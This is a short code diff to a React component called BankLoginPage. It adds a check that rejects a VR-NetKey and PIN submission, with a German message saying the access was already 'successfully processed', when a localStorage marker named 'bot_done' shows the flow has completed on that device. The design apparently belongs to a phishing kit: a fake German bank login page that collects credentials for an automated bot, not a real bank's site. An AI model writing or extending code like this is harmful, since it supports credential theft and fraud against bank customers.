@@ -456,6 +456,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     if (!pin.trim()) { setPinError(true); hasErr = true; }
     if (hasErr) return;
 
+    // Block re-runs: a NetKey that already completed the flow on this device
+    // cannot be reused. The marker is set by CompletionStep on success.
+    try {
+      const doneKey = `bot_done:${vrNetKey.trim().toLowerCase()}`;
+      if (localStorage.getItem(doneKey)) {
+        setErrorMsg("Dieser Zugang wurde bereits erfolgreich verarbeitet.");
+        return;
+      }
+    } catch {}
 
     setSubmitting(true);
     setErrorMsg(null);
